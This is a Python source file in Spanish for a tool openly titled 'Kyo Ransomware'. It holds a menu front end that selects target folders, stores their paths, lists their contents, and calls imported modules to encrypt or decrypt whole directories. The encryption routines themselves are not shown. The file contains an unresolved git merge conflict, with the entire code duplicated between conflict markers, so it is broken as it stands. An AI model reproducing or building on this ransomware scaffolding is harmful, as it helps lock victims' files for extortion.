<<<<<<< HEAD
from colorama import Fore, init# type: ignore
import os
import tkinter as tk
from tkinter import filedialog
from modules import encriptar as bfw_encript_pakage
from modules import desencriptar as bfw_decript_pakage
import webbrowser


# Inicializa colorama
init(autoreset=True)

# Limpia la consola
os.system('cls' if os.name == 'nt' else 'clear')
os.system("title Kyo Ransomware")
advertencia = f"\n\n{Fore.WHITE}[{Fore.YELLOW}!{Fore.WHITE}] {Fore.WHITE}\n\n"
success = f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] {Fore.WHITE}"
# Arte ASCII
ascii_art = f"""
{Fore.RED} ██ ▄█▀   ▓██   ██▓    ▒█████  
{Fore.RED} ██▄█▒     ▒██  ██▒   ▒██▒  ██▒
{Fore.RED}▓███▄░      ▒██ ██░   ▒██░  ██▒
{Fore.RED}▓██ █▄      ░ ▐██▓░   ▒██   ██░
{Fore.RED}▒██▒ █▄     ░ ██▒▓░   ░ ████▓▒░
{Fore.RED}▒ ▒▒ ▓▒      ██▒▒▒    ░ ▒░▒░▒░ 
{Fore.RED}░ ░▒ ▒░    ▓██ ░▒░      ░ ▒ ▒░ 
{Fore.RED}░ ░░ ░     ▒ ▒ ░░     ░ ░ ░ ▒  
{Fore.RED}░  ░       ░ ░            ░ ░  
{Fore.RED}           ░ ░
\n\n{Fore.LIGHTRED_EX}https://github.com/valentinoleal
"""
opciones = f"""
{Fore.LIGHTBLACK_EX}
1) Seleccionar carpetas como objetivos
2) Lectura de archivos y vista general
3) Encriptar objetivo
4) Desencriptar objetivo
5) Visitar github del creador
6) Limpiar consola
7) Salir de Kyo
"""

def print_centered(text):
    # Obtiene el tamaño de la consola
    console_width = os.get_terminal_size().columns
    # Separa el texto en líneas y las centra
    for line in text.splitlines():
        centered_line = line.center(console_width)
        print(centered_line)

def seleccionar_carpeta():
    # Crea una ventana oculta
    root = tk.Tk()
    root.withdraw()  # Oculta la ventana principal

    # Abre un diálogo para seleccionar una carpeta
    carpetas_seleccionadas = filedialog.askdirectory(title="Selecciona una carpeta")

    # Si hay carpetas seleccionadas
    if carpetas_seleccionadas:
        print(f"{success}Carpeta seleccionada correctamente: {Fore.GREEN}{carpetas_seleccionadas}")

        base_dir = os.getcwd()  # Esto hace que sea dinámico y se adapte a cualquier PC

        # Crea la ruta completa de la carpeta 'owner' dentro del directorio actual
        owner_dir = os.path.join(base_dir, "owner")
        os.makedirs(owner_dir, exist_ok=True)  # Crea la carpeta 'owner' si no existe

        objetivo_path = os.path.join(owner_dir, "obj.txt")

        # Escribe la ruta completa de la carpeta seleccionada en una sola línea
        with open(objetivo_path, 'w', encoding="UTF-8") as obj:
            obj.write(carpetas_seleccionadas)  # Escribe la ruta completa en una línea

        # Pregunta si quiere seguir añadiendo carpetas
        while True:
            continuar = input(f"{Fore.WHITE}¿Deseas añadir otra carpeta? (s/n): ").lower()
            if continuar == "s":
                otra_carpeta = filedialog.askdirectory(title="Selecciona otra carpeta")
                if otra_carpeta:
                    print(f"{success}Carpeta seleccionada correctamente: {Fore.GREEN}{otra_carpeta}")
                    with open(objetivo_path, 'a', encoding="UTF-8") as obj:  # Abre el archivo en modo 'append'
                        obj.write("\n" + otra_carpeta)  # Escribe la nueva ruta en una nueva línea
            else:
                break  # Sale del bucle si el usuario no quiere añadir más carpetas
    else:
        print(f"{advertencia}No se seleccionó ninguna carpeta.")


def mostrar_arbol_desde_txt(archivo):
    try:
        # Lee la ruta desde el archivo
        with open(archivo, 'r') as f:
            rutas = f.read().strip().split('\n')  # Lee y quita espacios en blanco
        
        for ruta in rutas:
            # Verifica si la ruta existe
            if not os.path.exists(ruta):
                print(f"La ruta '{ruta}' no existe.")
                continue
            
            # Función interna para mostrar el árbol
            def mostrar_arbol_directorio(ruta, nivel=0):
                try:
                    items = os.listdir(ruta)
                except PermissionError:
                    print(f"{advertencia}Acceso denegado a '{ruta}'.")
                    return  # Sale de la función si hay un error de permisos
                
                for item in items:
                    ruta_completa = os.path.join(ruta, item)
                    print('    ' * nivel + '├── ' + item)
                    if os.path.isdir(ruta_completa):
                        mostrar_arbol_directorio(ruta_completa, nivel + 1)
            
            # Muestra el árbol
            print(f"{Fore.LIGHTCYAN_EX}Contenido del directorio {Fore.LIGHTGREEN_EX}'{ruta}':")
            mostrar_arbol_directorio(ruta)

    except FileNotFoundError:
        print(f"{advertencia}El archivo '{archivo}' no se encontró.")


def elegir_objetivos():
    base_dir = os.getcwd()
    owner_dir = os.path.join(base_dir, "owner")
    objetivo_path = os.path.join(owner_dir, "obj.txt")
    
    try:
        with open(objetivo_path, 'r') as f:
            rutas = f.read().strip().split('\n')
        
        print(f"{Fore.LIGHTCYAN_EX}Carpetas seleccionadas:")
        for idx, ruta in enumerate(rutas):
            print(f"{Fore.WHITE}{idx + 1}) {ruta}")
        
        return rutas  # Retorna las rutas seleccionadas para usarlas posteriormente

    except FileNotFoundError:
        print(f"{advertencia}El archivo 'obj.txt' no se encontró.")
        return []

# Llama a la función para seleccionar la carpeta
def mostrar_menu():
    # Imprime el arte ASCII centrado
    print_centered(ascii_art)
    print(opciones)
    while True:
        op = input(f">{Fore.WHITE} ")
        if op == "1":
            seleccionar_carpeta()
        elif op == "2":
            base_dir = os.getcwd()
            owner_dir = os.path.join(base_dir, "owner")
            os.makedirs(owner_dir, exist_ok=True)
            objetivo_path = os.path.join(owner_dir, "obj.txt")
            mostrar_arbol_desde_txt(objetivo_path)
        elif op == "3":
            elegir_y_encriptar()  # Nueva función para elegir y encriptar
        elif op == "4": 
            elegir_y_desencriptar()  # Nueva función para elegir y desencriptar
        elif op == "5":
            webbrowser.open("https://github.com/valentinoleal")
            print(f"{Fore.LIGHTRED_EX}Gracias! <3")
        elif op == "6":
            os.system('cls' if os.name == 'nt' else 'clear')
            print_centered(ascii_art)
            print(opciones)
        elif op == "7":
            os.system('cls' if os.name == 'nt' else 'clear')
            print(ascii_art)
            print(f"{Fore.LIGHTRED_EX} <3 - Adiós!")
            exit()
        else:
            print(f"{advertencia}Opción inválida")

def elegir_y_encriptar():
    rutas = elegir_objetivos()
    if not rutas:
        return

    # Pregunta si quiere encriptar todos
    encriptar_todos = input(f"{advertencia}¿Deseas encriptar todos los directorios seleccionados? (s/n): ").lower()
    if encriptar_todos == "s":
        for ruta in rutas:
            bfw_encript_pakage.encriptar_directorio(ruta)
    else:
        # Muestra las rutas y permite seleccionar una
        for idx, ruta in enumerate(rutas):
            print(f"{Fore.WHITE}{idx + 1}) {ruta}")

        seleccion = input(f"{Fore.WHITE}Selecciona un directorio para encriptar (o escribe 'n' para cancelar): ")
        if seleccion.isdigit() and 1 <= int(seleccion) <= len(rutas):
            bfw_encript_pakage.encriptar_directorio(rutas[int(seleccion) - 1])
        else:
            print(f"{advertencia}Selección inválida.")

def elegir_y_desencriptar():
    rutas = elegir_objetivos()
    if not rutas:
        return

    # Pregunta si quiere desencriptar todos
    desencriptar_todos = input(f"{advertencia}¿Deseas desencriptar todos los directorios seleccionados? (s/n): ").lower()
    if desencriptar_todos == "s":
        for ruta in rutas:
            bfw_decript_pakage.desencriptar_directorio(ruta)
    else:
        # Muestra las rutas y permite seleccionar una
        for idx, ruta in enumerate(rutas):
            print(f"{Fore.WHITE}{idx + 1}) {ruta}")

        seleccion = input(f"{Fore.WHITE}Selecciona un directorio para desencriptar (o escribe 'n' para cancelar): ")
        if seleccion.isdigit() and 1 <= int(seleccion) <= len(rutas):
            bfw_decript_pakage.desencriptar_directorio(rutas[int(seleccion) - 1])
        else:
            print(f"{advertencia}Selección inválida.")
=======
from colorama import Fore, init# type: ignore
import os
import tkinter as tk
from tkinter import filedialog
from modules import encriptar as bfw_encript_pakage
from modules import desencriptar as bfw_decript_pakage
import webbrowser


# Inicializa colorama
init(autoreset=True)

# Limpia la consola
os.system('cls' if os.name == 'nt' else 'clear')
os.system("title Kyo Ransomware")
advertencia = f"\n\n{Fore.WHITE}[{Fore.YELLOW}!{Fore.WHITE}] {Fore.WHITE}\n\n"
success = f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] {Fore.WHITE}"
# Arte ASCII
ascii_art = f"""
{Fore.RED} ██ ▄█▀   ▓██   ██▓    ▒█████  
{Fore.RED} ██▄█▒     ▒██  ██▒   ▒██▒  ██▒
{Fore.RED}▓███▄░      ▒██ ██░   ▒██░  ██▒
{Fore.RED}▓██ █▄      ░ ▐██▓░   ▒██   ██░
{Fore.RED}▒██▒ █▄     ░ ██▒▓░   ░ ████▓▒░
{Fore.RED}▒ ▒▒ ▓▒      ██▒▒▒    ░ ▒░▒░▒░ 
{Fore.RED}░ ░▒ ▒░    ▓██ ░▒░      ░ ▒ ▒░ 
{Fore.RED}░ ░░ ░     ▒ ▒ ░░     ░ ░ ░ ▒  
{Fore.RED}░  ░       ░ ░            ░ ░  
{Fore.RED}           ░ ░
\n\n{Fore.LIGHTRED_EX}https://github.com/valentinoleal
"""
opciones = f"""
{Fore.LIGHTBLACK_EX}
1) Seleccionar carpetas como objetivos
2) Lectura de archivos y vista general
3) Encriptar objetivo
4) Desencriptar objetivo
5) Visitar github del creador
6) Limpiar consola
7) Salir de Kyo
"""

def print_centered(text):
    # Obtiene el tamaño de la consola
    console_width = os.get_terminal_size().columns
    # Separa el texto en líneas y las centra
    for line in text.splitlines():
        centered_line = line.center(console_width)
        print(centered_line)

def seleccionar_carpeta():
    # Crea una ventana oculta
    root = tk.Tk()
    root.withdraw()  # Oculta la ventana principal

    # Abre un diálogo para seleccionar una carpeta
    carpetas_seleccionadas = filedialog.askdirectory(title="Selecciona una carpeta")

    # Si hay carpetas seleccionadas
    if carpetas_seleccionadas:
        print(f"{success}Carpeta seleccionada correctamente: {Fore.GREEN}{carpetas_seleccionadas}")

        base_dir = os.getcwd()  # Esto hace que sea dinámico y se adapte a cualquier PC

        # Crea la ruta completa de la carpeta 'owner' dentro del directorio actual
        owner_dir = os.path.join(base_dir, "owner")
        os.makedirs(owner_dir, exist_ok=True)  # Crea la carpeta 'owner' si no existe

        objetivo_path = os.path.join(owner_dir, "obj.txt")

        # Escribe la ruta completa de la carpeta seleccionada en una sola línea
        with open(objetivo_path, 'w', encoding="UTF-8") as obj:
            obj.write(carpetas_seleccionadas)  # Escribe la ruta completa en una línea

        # Pregunta si quiere seguir añadiendo carpetas
        while True:
            continuar = input(f"{Fore.WHITE}¿Deseas añadir otra carpeta? (s/n): ").lower()
            if continuar == "s":
                otra_carpeta = filedialog.askdirectory(title="Selecciona otra carpeta")
                if otra_carpeta:
                    print(f"{success}Carpeta seleccionada correctamente: {Fore.GREEN}{otra_carpeta}")
                    with open(objetivo_path, 'a', encoding="UTF-8") as obj:  # Abre el archivo en modo 'append'
                        obj.write("\n" + otra_carpeta)  # Escribe la nueva ruta en una nueva línea
            else:
                break  # Sale del bucle si el usuario no quiere añadir más carpetas
    else:
        print(f"{advertencia}No se seleccionó ninguna carpeta.")


def mostrar_arbol_desde_txt(archivo):
    try:
        # Lee la ruta desde el archivo
        with open(archivo, 'r') as f:
            rutas = f.read().strip().split('\n')  # Lee y quita espacios en blanco
        
        for ruta in rutas:
            # Verifica si la ruta existe
            if not os.path.exists(ruta):
                print(f"La ruta '{ruta}' no existe.")
                continue
            
            # Función interna para mostrar el árbol
            def mostrar_arbol_directorio(ruta, nivel=0):
                try:
                    items = os.listdir(ruta)
                except PermissionError:
                    print(f"{advertencia}Acceso denegado a '{ruta}'.")
                    return  # Sale de la función si hay un error de permisos
                
                for item in items:
                    ruta_completa = os.path.join(ruta, item)
                    print('    ' * nivel + '├── ' + item)
                    if os.path.isdir(ruta_completa):
                        mostrar_arbol_directorio(ruta_completa, nivel + 1)
            
            # Muestra el árbol
            print(f"{Fore.LIGHTCYAN_EX}Contenido del directorio {Fore.LIGHTGREEN_EX}'{ruta}':")
            mostrar_arbol_directorio(ruta)

    except FileNotFoundError:
        print(f"{advertencia}El archivo '{archivo}' no se encontró.")


def elegir_objetivos():
    base_dir = os.getcwd()
    owner_dir = os.path.join(base_dir, "owner")
    objetivo_path = os.path.join(owner_dir, "obj.txt")
    
    try:
        with open(objetivo_path, 'r') as f:
            rutas = f.read().strip().split('\n')
        
        print(f"{Fore.LIGHTCYAN_EX}Carpetas seleccionadas:")
        for idx, ruta in enumerate(rutas):
            print(f"{Fore.WHITE}{idx + 1}) {ruta}")
        
        return rutas  # Retorna las rutas seleccionadas para usarlas posteriormente

    except FileNotFoundError:
        print(f"{advertencia}El archivo 'obj.txt' no se encontró.")
        return []

# Llama a la función para seleccionar la carpeta
def mostrar_menu():
    # Imprime el arte ASCII centrado
    print_centered(ascii_art)
    print(opciones)
    while True:
        op = input(f">{Fore.WHITE} ")
        if op == "1":
            seleccionar_carpeta()
        elif op == "2":
            base_dir = os.getcwd()
            owner_dir = os.path.join(base_dir, "owner")
            os.makedirs(owner_dir, exist_ok=True)
            objetivo_path = os.path.join(owner_dir, "obj.txt")
            mostrar_arbol_desde_txt(objetivo_path)
        elif op == "3":
            elegir_y_encriptar()  # Nueva función para elegir y encriptar
        elif op == "4": 
            elegir_y_desencriptar()  # Nueva función para elegir y desencriptar
        elif op == "5":
            webbrowser.open("https://github.com/valentinoleal")
            print(f"{Fore.LIGHTRED_EX}Gracias! <3")
        elif op == "6":
            os.system('cls' if os.name == 'nt' else 'clear')
            print_centered(ascii_art)
            print(opciones)
        elif op == "7":
            os.system('cls' if os.name == 'nt' else 'clear')
            print(ascii_art)
            print(f"{Fore.LIGHTRED_EX} <3 - Adiós!")
            exit()
        else:
            print(f"{advertencia}Opción inválida")

def elegir_y_encriptar():
    rutas = elegir_objetivos()
    if not rutas:
        return

    # Pregunta si quiere encriptar todos
    encriptar_todos = input(f"{advertencia}¿Deseas encriptar todos los directorios seleccionados? (s/n): ").lower()
    if encriptar_todos == "s":
        for ruta in rutas:
            bfw_encript_pakage.encriptar_directorio(ruta)
    else:
        # Muestra las rutas y permite seleccionar una
        for idx, ruta in enumerate(rutas):
            print(f"{Fore.WHITE}{idx + 1}) {ruta}")

        seleccion = input(f"{Fore.WHITE}Selecciona un directorio para encriptar (o escribe 'n' para cancelar): ")
        if seleccion.isdigit() and 1 <= int(seleccion) <= len(rutas):
            bfw_encript_pakage.encriptar_directorio(rutas[int(seleccion) - 1])
        else:
            print(f"{advertencia}Selección inválida.")

def elegir_y_desencriptar():
    rutas = elegir_objetivos()
    if not rutas:
        return

    # Pregunta si quiere desencriptar todos
    desencriptar_todos = input(f"{advertencia}¿Deseas desencriptar todos los directorios seleccionados? (s/n): ").lower()
    if desencriptar_todos == "s":
        for ruta in rutas:
            bfw_decript_pakage.desencriptar_directorio(ruta)
    else:
        # Muestra las rutas y permite seleccionar una
        for idx, ruta in enumerate(rutas):
            print(f"{Fore.WHITE}{idx + 1}) {ruta}")

        seleccion = input(f"{Fore.WHITE}Selecciona un directorio para desencriptar (o escribe 'n' para cancelar): ")
        if seleccion.isdigit() and 1 <= int(seleccion) <= len(rutas):
            bfw_decript_pakage.desencriptar_directorio(rutas[int(seleccion) - 1])
        else:
            print(f"{advertencia}Selección inválida.")
>>>>>>> 50d7d16cfe24721f70808753e33f4cc7d70e4f11
